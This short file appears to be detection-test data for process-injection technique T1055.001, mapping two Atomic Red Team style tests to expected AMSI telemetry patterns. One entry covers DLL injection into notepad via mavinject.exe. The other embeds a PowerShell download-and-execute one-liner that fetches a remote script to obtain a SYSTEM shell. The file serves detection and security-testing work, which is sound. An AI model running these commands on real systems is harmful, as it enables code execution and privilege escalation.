T1055.001,windows,74496461,Process Injection via mavinject.exe
ARG,process_id,(Start-Process notepad -PassThru).id
ARG,dll_payload,PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll
_E_,AMSI,app_name~=PowerShell
_E_,AMSI,scan_content~=$mypid = #{process_id}
_E_,AMSI,scan_content*=mavinject .*mypid /INJECTRUNNING .*atomics.*T1055.001.*src.*x64.*T1055.001.dll
_E_,AMSI,scan_content~=Stop-Process -processname notepad

T1055.001,windows,8b56f787,WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique
_E_,AMSI,app_name~=PowerShell
_E_,AMSI,scan_content~=iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')

